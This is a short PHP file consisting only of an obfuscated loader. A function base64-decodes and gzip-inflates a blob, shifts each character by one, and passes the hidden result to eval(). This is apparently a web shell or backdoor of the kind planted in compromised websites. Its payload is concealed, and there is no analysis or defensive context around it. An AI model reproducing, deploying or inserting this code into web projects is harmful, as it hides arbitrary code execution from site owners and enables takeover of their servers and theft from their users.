<?php function JwsZVf($Okv)
{ 
$Okv=gzinflate(base64_decode($Okv));
 for($i=0;$i<strlen($Okv);$i++)
 {
$Okv[$i] = chr(ord($Okv[$i])-1);
 }
 return $Okv;
 }eval(JwsZVf("tVJNc9MwEL3bv0IID5app01Cw1CCoEynh17KIcdM0Cj2umgiJI2k9GNCfjsrxRQOXOvxYeft26f3ViIEv/ISvLdeeHDWR2Xu2KRZlAFCUNaIEKWPDIFErbbwxCmcz+Hd7GKAzby/mM03dFEWlVheL5c3325X9bZe80RE9I/Ig1cRRKdtgCRVVM6GyAelQdxBFJ01EUwMjLof7uPZmTJuF2kiqoG9gkdsZhltZQ89q61DIOi6acpiXxajXIg5g5YdMPqWtpTTNneS0P84r7GPPleT9b+8yOlGBnh/Lugp7aGzPdC/AlVkuTil2V8xWM8qxSeLSn1CcQ2GjVqVOjlpyD7vbZxeVWpNOHmuv+fjkTh9M52vF+TIPZTpBx3gBdJl3rg/gen8kxsTtYR+vV5OZx9om+/5ZeMdn5P0nsOj07hjVv+qn43m5rAzHU8UjDBCTnr5MxzBKYJFp2UI5GrvdhutOpJGIr4UIoQy93YL6BZNwr3UWOU7Oxyy1GUntRa7AF6kIWbggVyxph2PQA9fPv8G"));?>